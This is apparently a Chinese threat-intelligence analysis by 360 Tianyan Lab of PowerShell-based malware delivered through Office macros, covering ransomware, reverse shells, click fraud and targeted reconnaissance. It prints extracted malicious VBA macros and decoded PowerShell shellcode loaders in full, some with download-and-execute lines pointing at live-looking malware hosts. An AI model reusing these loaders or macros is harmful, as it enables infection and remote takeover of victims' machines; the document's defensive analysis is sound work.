# Powershell恶意代码的N种姿势

**Author:360天眼实验室**

0x00 引言
=======

* * *

人在做，天在看。

技术从来都是中性的，被用来行善还是作恶完全取决于运用它的人。原子能可以用来发电为大众提供清洁能源，也可以用来制造能毁灭全人类的核武器，这不是一个完善的世界，于是我们既有核电站也有了核武器。

Powershell，曾经Windows系统管理员的称手工具，在恶意代码制造和传播者手里也被玩得花样百出。由于Powershell的可执行框架部分是系统的组件不可能被查杀，而驱动它的脚本是非PE的而非常难以通过静态方法判定恶意性，同时脚本可以非常小巧而在系统底层的支持下功能却可以非常强大，这使利用Powershell的恶意代码绕过常规的病毒防护对系统为所欲为。因此，360天眼实验室近期看到此类恶意代码泛滥成灾就毫不奇怪，事实上，我们甚至看到所跟踪的APT团伙也开始转向Powershell。

本文我们向大家展示一些看到的实际恶意代码的例子。

0x01 实例分析
=========

* * *

这里我们基于360威胁情报中心的数据，对接触到的Powershell恶意代码按分类各举一例。

### 勒索软件

我们知道现在勒索软件以其直接的变现方式现在已成为黑产的宠儿，像雨后春笋那样冒出来的勒索软件中，我们看到了使用纯Powershell脚本实现的例子。

样本MD5：ea7775da99367ac89f70f2a95c7f8e8e

这是一个通过Word文档中嵌入宏以诱导执行的勒索软件，使用工具提取出其中的宏，内容如下：

```
"vba_code": "Private Sub Document_Open() Dim FGHNBVRGHJJGFDSDUUUU As String FGHNBVRGHJJGFDSDUUUU = "cmd /K " + "pow" + "er" + "Sh" + "ell.e" + "x" + "e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile('http://rxlawyer.in/file.php','%TEMP%\Y.ps1'); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\Y.ps1" Shell FGHNBVRGHJJGFDSDUUUU, 0 MsgBox ("Module could not be found.") FGHHH = 7 * 2 DGHhhdRGHH = 9 + 23 End Sub"

```

宏的功能是下载`http://rxlawyer.in/file.php`到本地的temp目录下，并用Powershell运行这个文件。而下载回来的file.php本质上是一个ps的脚本文件，MD5为：dd180477d6a0bb6ce3c29344546ebdfc 。

勒索者脚本的实现原理是：通过随机生成加密密钥与用户ID，将加密密钥与用户ID信息上传到服务器进行备份，在用户机器上使用对称算法将用户的文档进行加密。因为密钥为随机生成，除非拥有攻击者服务器上备份的密钥，否则很难将被加密的文档进行还原。

脚本的原貌为：

![p1](http://drops.javaweb.org/uploads/images/86887377fd64c94879257bd577178866dba46781.jpg)

可见，脚本做了混淆处理，简单处理以后归纳出的脚本主要执行过程如下：

1.生成三个随机数，分别表示加密密钥、加密用的盐、UUID

![p2](http://drops.javaweb.org/uploads/images/3b19621e20d1d0780312dd691219c3506cabcc77.jpg)

把上面生成随机数发送到服务器中保存

![p3](http://drops.javaweb.org/uploads/images/c56069f62b56c23fa0280a5135c1ab8051ac5f90.jpg)

2.用随机数生成加密容器

![p4](http://drops.javaweb.org/uploads/images/7f3b5c58593211ddeb988c8e6a0430852cace41f.jpg)

![p5](http://drops.javaweb.org/uploads/images/7dac2f8477f8bd02efbdebac6ba8d936ca5527a7.jpg)

3.得到磁盘中的所有的指定后缀的文件

调用`Get-PSDrive`，得到所有文件名

```
$folder= gdr|where {$_.Free}|Sort-Object -Descending 

```

![p6](http://drops.javaweb.org/uploads/images/596ac08027aabe271b198c09fd45e54e9251eb05.jpg)

4.加密这些文件的前2048个字节后写回文件

![p7](http://drops.javaweb.org/uploads/images/7c5625ae4cb14a86200479a5084f13ded2d11c65.jpg)

5.解码Base64得到提示勒索的html文件

![p8](http://drops.javaweb.org/uploads/images/7e3ed44fd5bf08f5f3df58fc136d41888d18f50d.jpg)

在html文件的尾部添加上赎回密钥用的UUID及当前时间

![p9](http://drops.javaweb.org/uploads/images/db233f42946dcb07a7433cbbd32374d9b9ad4a7d.jpg)

### 渗透测试

此类样本大多使用网络上的nishang开源工具包生成的攻击文件。攻击文件以Word、Excel、CHM、LNK等格式的文件为载体，嵌入Payload，实现获得反弹Shell等功能，实现对系统的控制。

样本MD5：929d104ae3f02129bbf9fa3c5cb8f7a1

文件打开后，会显示文件损坏，用来迷惑用户，Word中的宏却悄然运行了。

![p10](http://drops.javaweb.org/uploads/images/51f95a42b5a4d794eb51d2fc1e8b054f6b712033.jpg)

宏的内容为：

```
Sub AutoOpen()
Dim x
x = "powershell -window hidden -enc JAAxACA[……]APQA” _
& "wB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIAAkAGUAIgA7AH0A"
Shell ("POWERSHELL.EXE " & x)
Dim title As String
title = "Critical Microsoft Office Error"
Dim msg As String
Dim intResponse As Integer
msg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."
intResponse = MsgBox(msg, 16, title)
Application.Quit
End Sub

```

将宏中的字符串，用Base64解码后，得到内容如下：

```
$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x34,0xff,0xf9,0x18,0xd9,0xeb,0xd9,0x74,[……] ,0xda,0x73,0x5d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}

```

将其中的shellcode提取出来进行分析得知，这段shellcode的主要功能是反向连接内网IP 192.168.1.30的4444端口。

![p11](http://drops.javaweb.org/uploads/images/056b6e9c88b9f417d823a6f8f7d49abe9591856e.jpg)

另一个与上述样本有着类似功能的样本的MD5为：1e39753fd56f17010ac62b1d84b5e650

从文件中提取出来的宏为：

![p12](http://drops.javaweb.org/uploads/images/af8d9e80fd4e6bb5fc6ca872144952b70787e9af.jpg)

而这四个函数对应的功能分别为

*   Execute：

用Powershell下载invoke-shellcode.ps后，通过invoke-shellcode函数调用指定Payload windows/meterpreter/reverse_https 建立反弹shell，反弹的地址为98.100.108.133，端口为443

其中部分代码为：

![p13](http://drops.javaweb.org/uploads/images/bd17f24769a364100b61c4b3268682cf321feb15.jpg)

*   Persist：

将Powershell建立反弹Shell的功能用VBS实现后，保存在C:\Users\Public\10-D.vbs文件中

*   Reg

新建HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load注册表，值指定为C:\Users\Public\10-D.vbs

*   Start

调用C:\Users\Public\10-D.vbs

而有时，为了抵抗杀毒软件的追杀，样本通常会进行Base64编码。

MD5：c49ee3fb4897dd1cdab1d0ae4fe55988

下面为提取出来的宏内容，可见代码使用了Base64编码：

```
"vba_code": "Sub Workbook_Open() 'VBA arch detect suggested by "T" Dim Command As String Dim str As String Dim exec As String Arch = Environ("PROCESSOR_ARCHITECTURE") windir = Environ("windir") If Arch = "AMD64" Then Command = windir + "\syswow64\windowspowershell\v1.0\powershell.exe" Else Command = "powershell.exe" End If str = "nVRtb9tGDP7uX0EIN0BCLEV+aZZYCNDUadZsdZrFbtLNMIazRFvXnO" str = str + "6U08mR4/q/j3I0x/06f9CZFI/PQ/Kh2BOcw3unNb2U8jrLtb"[……]str = str + "TjdLP9Fw==" exec = Command + " -NoP -NonI -W Hidden -Exec Bypass -Comm" exec = exec + "and ""Invoke-Expression $(New-Object IO.StreamRea" exec = exec + "

```

解码后的内容为：

```
$q = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpP
arameter, uint dwCreationFlags, IntPtr lpThreadId);
"@
try{$d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
function c($v){ return (([int[]] $v.ToCharArray() | Measure-Object -Sum).Sum % 0x100 -eq 92)}
function t {$f = "";1..3|foreach-object{$f+= $d[(get-random -maximum $d.Length)]};return $f;}
function e { process {[array]$x = $x + $_}; end {$x | sort-object {(new-object Random).next()}}}
function g{ for ($i=0;$i -lt 64;$i++){$h = t;$k = $d | e;  foreach ($l in $k){$s = $h + $l; if (c($s)) { return $s }}}return "9vXU";}
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$m = New-Object System.Net.WebClient;
$m.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)");$n = g; [Byte[]] $p = $m.DownloadData("https://192.168.0.105:4444/$n
" )
$o = Add-Type -memberDefinition $q -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,$p.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($p, 0, [IntPtr]($x.ToInt32()), $p.Length)
$o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}

```

脚本的功能是通过g函数随机生成四位的字符，从内网网址下载后加载执行`https://192.168.0.105:4444/xxxx`（其中xxxx为随机四位字符）

这里连接的是192.168.0.105为内网IP，此样本很可能是渗透者进行内网渗透攻击的测试样本。此类样本还有很多：

*   eae0906f98568c5fb25b2bb32b1dbed7

![p14](http://drops.javaweb.org/uploads/images/e4a2f959d2834c59a1b5ee54814608d3d7c83461.jpg)

*   1a42671ce3b2701956ba49718c9e118e

![p15](http://drops.javaweb.org/uploads/images/bdc3a3ec38bdf7cf923ddc68363147a167b2493d.jpg)

*   496ed16e636203fa0eadbcdc182b0e85

![p16](http://drops.javaweb.org/uploads/images/2bcc2005bc7dd9e999a8bf1e505a8643faf2dc75.jpg)

使用LNK文件，建立反弹shell的样本

![p17](http://drops.javaweb.org/uploads/images/bbb804f8a7a86895033f6b94252dae3cfb0910a6.jpg)

### 流量欺骗

为了快速提升网站流量、Alexa排名、淘宝网店访问量、博客人气、每日访问IP、PV、UV等，有些网站站长会采取非常规的引流方法，采用软件在后台模拟人正常访问网页的点击动作而达到提升流量的目的。

样本MD5：5f8dc4db8a658b7ba185c2f038f3f075

文档打开后里面只有“test by c”这几个文字

![p18](http://drops.javaweb.org/uploads/images/d0b456c9ebd1d86c483c1bde9b095ab1bb62bb5f.jpg)

提取出文档中的宏中的加密字符解密后得到可读的ps脚本如下

```
$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,[……] ,0x31,0x32,0x38,0x2e,0x31,0x39,0x36,0x2e,0x38,0x34,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $e";}

```

可见，ps脚本的主要功能就是执行Shellcode，这段Shellcode的功能就是调用wininet.dll中的函数进行连接138.128.196.84地址的443端口。而138.128.196.84地址正为流量宝类的软件用的地址。

![p19](http://drops.javaweb.org/uploads/images/4b63be4a1768550acba512601851c9968e477359.jpg)

### 探测控制

样本对通过宏调用Powershell下载PE文件在受影响的系统上检查是否为关心的目标并执行进一步地操作，具备针对性攻击的特点。

样本MD5：fba6b329876533f28d317e60fe53c8d3

从样本中抽取出的宏主要是根据系统版本下载相应的文件执行

```
Sub AutoOpen()
    x1 = "Download"
    h = "Str"
    o = "power" & "shell" & ".exe"
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    abcdef = h & "ing"
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
    objProcess.Create o & " -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient)." & x1 & abcdef & "('http://rabbitons.pw/cache') | iex } else {(new-object Net.WebClient)." & x1 & abcdef & "('http://rabbitons.pw/css') | iex}", Null, objConfig, intProcessID

```

其中的对应32位系统的cache文件的内容如下：

![p20](http://drops.javaweb.org/uploads/images/b384a5765edad0f0d604efeb9d5e96d20778d462.jpg)

我们对Shellcode进行简单分析：

1.在内存中解密，生成一个PE文件，在内存中展开跳到入口点处执行，将PE文件的.BSS区段进行解码，解码算法如下：

![p21](http://drops.javaweb.org/uploads/images/32ab9946505f22e71c066db6001bafb4bd37dfcd.jpg)

![p22](http://drops.javaweb.org/uploads/images/7434aa9025ea31147d3126380c09b80ca47f2229.jpg)

解密后的结果为：

![p23](http://drops.javaweb.org/uploads/images/9516c729f1193ccd3379310f3cda18b46391324c.jpg)

2.判断是不是64位系统

![p24](http://drops.javaweb.org/uploads/images/f4063cebd69b1fd157448d7dfcb36283107af621.jpg)

判断虚拟机

![p25](http://drops.javaweb.org/uploads/images/5e9d61cc8416a9f8829e9f41bb93b50d04abdb59.jpg)

![p26](http://drops.javaweb.org/uploads/images/5da14c6a069aff81d31f827344a08d8cb8fed562.jpg)

3.用FindFirstUrlCacheEntry和FindNextUrlCacheEntry遍历IE临时文件目录 ，用于判断用户是否是攻击者的目标用户

![p27](http://drops.javaweb.org/uploads/images/3f1a0c13b69d148381aa74be7f5050a4a60cce45.jpg)

![p28](http://drops.javaweb.org/uploads/images/77164d9ebbe00fbcb179f7f3e40778aeb6ee05c7.jpg)

4.计算用户和电脑信息的HASH

![p29](http://drops.javaweb.org/uploads/images/a494f0082c58ed782a0657abaa6e81e1ee4901c2.jpg)

随后B03938处创建线程进行下面的动作

判断`ipconfig -all`命令中是否有.edu、school、hospital、colledge、health、nurse等字符串

![p30](http://drops.javaweb.org/uploads/images/19150d154c8f825b3b5a3c57721a19766233949f.jpg)

调用`cmd /C ""ipconfig -all > C:\DOCUME~1\yyyyy\LOCALS~1\Temp\xxxx.TMP`(xxx代表随机数)生成文件，检测.edu、school、hospital、colledge、health、nurse等字符串

![p31](http://drops.javaweb.org/uploads/images/655dae0931d7e2a9e7fb804a760f026f9eaef2fe.jpg)

![p32](http://drops.javaweb.org/uploads/images/29a94dee396230e9b4e3a358145c660844041efc.jpg)

5.遍历系统中的进程，检测有否指定hash的进程正在运行

![p33](http://drops.javaweb.org/uploads/images/a1332b435d3d8e8416e419d9c4f50f47f860e4dc.jpg)

从IE缓存中查找用户是不是访问过这些网址：

通过WININET.FindFirstUrlCacheEntryW , WININET.FindNextUrlCacheEntryW WININET.FindCloseUrlCache

![p34](http://drops.javaweb.org/uploads/images/1ca2972b0115b498712c2f23166abc14879aa114.jpg)

得到`net view`命令返回值中是否有pos、store、shop、sale等字符串

![p35](http://drops.javaweb.org/uploads/images/0ae4a7d67301af868a5a49891a7880a90d1e58fc.jpg)

发送用户信息，并下载相对应的恶意程序：

![p36](http://drops.javaweb.org/uploads/images/fc4154b8227f43918dfe950cb760fd2988aa80d5.jpg)

其中，用这种手法的恶意样本还有如下：

| 样本HASH | 系统版本 | 下载地址 |
| --- | --- | --- |
| f0483b9cfb8deb7ff97962b30fc779ad | 32位 | https://github.com/flowsdem/found/raw/master/rost |
| 64位 | https://github.com/flowsdem/found/raw/master/virst |
| fba6b329876533f28d317e60fe53c8d3 | 32位 | http://rabbitons.pw/cache |
| 64位 | http://rabbitons.pw/css |
| 62967bf585eef49f065bac233b506b36 | 32位 | https://github.com/minifl147/flue/raw/master/memo |
| 64位 | https://github.com/minifl147/flue/raw/master/adv |

### 信息搜集

样本中的宏代码下载执行信息收集类的Powershell脚本，很可能是某些针对性攻击的前导。

样本MD5：f7c3c7df2e7761eceff991bf457ed5b9

提取出来的宏代码为：

![p37](http://drops.javaweb.org/uploads/images/f0bf819e3e22f6d69ade682d42fc75ed68f26462.jpg)

下载一个名为Get-Info-2.ps1的脚本，脚本功能是将本机的IP地址、domainname、username、usbid等发送到远端服务器中。

![p38](http://drops.javaweb.org/uploads/images/e011fd22f1a5c385a1bbe2f8f4f49360973e3e22.jpg)

0x02 总结
=======

* * *

天眼实验室再次提醒用户，此类恶意软件主要依赖通过微软的Office文档传播，用户应该确保宏不默认启用，提防任何来自不受信任来源的文件，当打开文件系统提示要使用宏时务必慎重。同时要尽量选用可靠的安全软件进行防范，如无必要不要关闭安全软件，当发现系统出现异常情况，应及时查杀木马，尽可能避免各类恶意代码的骚扰。

0x03 参考资料
=========

* * *

*   [http://news.softpedia.com/news/powerware-ransomware-abuses-microsoft-word-and-powershell-to-infect-users-502200.shtml](http://news.softpedia.com/news/powerware-ransomware-abuses-microsoft-word-and-powershell-to-infect-users-502200.shtml)
*   [https://www.carbonblack.com/2016/03/25/threat-alert-powerware-new-ransomware-written-in-powershell-targets-organizations-via-microsoft-word/](https://www.carbonblack.com/2016/03/25/threat-alert-powerware-new-ransomware-written-in-powershell-targets-organizations-via-microsoft-word/)
*   [https://www.10dsecurity.com/](https://www.10dsecurity.com/)